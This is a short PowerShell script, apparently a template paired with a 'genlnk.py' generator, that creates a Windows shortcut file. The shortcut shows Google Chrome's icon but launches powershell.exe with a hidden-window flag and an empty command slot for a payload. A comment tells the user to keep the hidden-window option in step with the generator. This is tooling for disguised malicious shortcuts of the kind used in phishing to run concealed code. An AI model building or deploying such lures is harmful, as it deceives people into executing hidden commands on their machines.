$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("c:\users\ieuser\desktop\template.lnk")
$Shortcut.IconLocation = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
$Shortcut.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
#Use ONE of the Shortcut.Arguments lines; if using '-w 1 -c...' to make powershell hidden, make sure you change genlnk.py as well!
#$Shortcut.Arguments = '-c ""'
$Shortcut.Arguments = '-w 1 -c ""' 
$Shortcut.WorkingDirectory = '%CD%'
$Shortcut.Save()